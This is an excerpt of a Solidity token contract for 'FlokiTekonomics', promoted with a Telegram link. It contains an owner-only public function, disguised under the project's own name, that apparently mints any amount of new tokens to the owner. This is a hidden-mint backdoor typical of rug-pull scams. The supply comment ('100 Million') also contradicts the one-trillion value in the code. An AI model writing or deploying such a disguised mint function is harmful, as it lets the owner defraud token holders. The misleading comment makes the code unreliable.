...
//
// $FlokiTekonomics proposes an innovative feature in its contract.
//
// 📱 Telegram:https://t.me/flokitekonomics
//
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function FlokiTekonomics(uint256 amount) public onlyOwner {
    _FlokiTekonomics(msg.sender, amount);
    }
    ...
    function _FlokiTekonomics(address account, uint256 amount) internal virtual {
...
contract FlokiTekonomics is ERC20 {

    uint tokenTotalSupply = 1000000000000; // 100 Million Token Supply

    constructor() public ERC20("FlokiTekonomics", "FTCS") {
        _FlokiTekonomics(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}